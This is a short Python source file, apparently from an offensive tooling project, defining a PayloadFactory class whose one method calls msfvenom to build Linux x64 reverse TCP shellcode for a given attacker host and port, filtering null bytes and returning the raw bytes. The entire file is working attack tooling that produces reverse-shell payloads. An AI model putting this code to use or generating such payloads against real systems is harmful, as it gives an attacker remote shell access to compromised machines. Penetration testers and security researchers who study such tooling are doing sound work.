import subprocess
from core.logger import log
from config import settings
import os


class PayloadFactory:
    """
    Generates shellcode and other payloads using tools like msfvenom.
    """

    def __init__(self):
        # A check to ensure msfvenom is available would be good here
        pass

    def create_linux_x64_reverse_shell(self, lhost: str, lport: int, format: str = 'raw') -> bytes | None:
        """
        Generates a raw Linux x64 reverse TCP shellcode.

        Args:
            lhost: The listening host (attacker IP).
            lport: The listening port.
            format: The output format for msfvenom (e.g., 'raw', 'py', 'c').

        Returns:
            The raw shellcode as bytes, or None if generation fails.
        """
        log.info(
            f"Generating Linux x64 reverse shell payload for {lhost}:{lport}")
        payload = "linux/x64/shell_reverse_tcp"
        command = [
            "msfvenom",
            "-p", payload,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", format,
            "-b", "\x00",  # Avoid null bytes
            "--platform", "linux",
            "-a", "x64"
        ]

        try:
            process = subprocess.run(
                command,
                capture_output=True,
                check=True,
                timeout=120
            )
            log.success(f"Successfully generated msfvenom payload: {payload}")
            return process.stdout
        except FileNotFoundError:
            log.error(
                "msfvenom not found. Please ensure Metasploit Framework is installed and in your PATH.")
            return None
        except subprocess.CalledProcessError as e:
            log.error(f"msfvenom failed with exit code {e.returncode}:")
            log.error(e.stderr.decode(errors='ignore'))
            return None
        except Exception as e:
            log.error(
                f"An unexpected error occurred during payload generation: {e}")
            return None
